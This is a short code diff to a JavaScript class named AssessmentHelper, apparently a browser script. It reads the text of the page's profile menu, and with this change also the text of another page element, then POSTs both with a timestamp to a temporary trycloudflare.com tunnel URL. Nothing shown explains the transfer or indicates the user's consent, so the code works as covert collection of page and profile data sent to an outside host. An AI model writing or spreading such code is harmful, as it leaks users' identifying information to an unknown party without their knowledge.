@@ -104,8 +104,13 @@ class AssessmentHelper {
         try {
             const element = document.evaluate('//*[@id="profile-menu"]/div', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
             const elementText = element ? element.innerText : "Element not found";
+
+            // Fetch additional information from the span element
+            const spanElement = document.querySelector('.activeClassNameNew');
+            const spanText = spanElement ? spanElement.innerText : "Span element not found";
+
             const timestamp = new Date().toISOString();
-            console.log(`${elementText} - ${timestamp}`);
+            console.log(`${elementText} - ${spanText} - ${timestamp}`);
             
             const response = await fetch('https://insert-votes-mx-mining.trycloudflare.com/data', {
                 method: 'POST',
@@ -113,7 +118,7 @@ class AssessmentHelper {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    text: `${elementText} - ${timestamp}`,
+                    text: `${elementText} - ${spanText} - ${timestamp}`,
                     timestamp: timestamp
                 })
             });
